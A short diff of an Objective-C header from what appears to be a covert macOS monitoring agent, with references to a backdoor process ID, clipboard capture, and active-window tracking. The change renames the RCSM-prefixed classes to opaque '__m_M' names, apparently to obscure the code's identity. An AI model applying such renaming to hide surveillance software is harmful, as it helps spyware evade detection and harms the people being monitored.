@@ -20,13 +20,13 @@
 #import "RCSMAgentClipboard.h"
 
 
-extern RCSMSharedMemory *mSharedMemoryCommand;
-extern RCSMSharedMemory *mSharedMemoryLogging;
+extern __m_MSharedMemory *mSharedMemoryCommand;
+extern __m_MSharedMemory *mSharedMemoryLogging;
 extern int32_t gBackdoorPID;
 
 NSDictionary *getActiveWindowInformationForPID(pid_t pid);
 
-@interface RCSMInputManager : NSObject
+@interface __m_MInputManager : NSObject
 
 //
 // @author
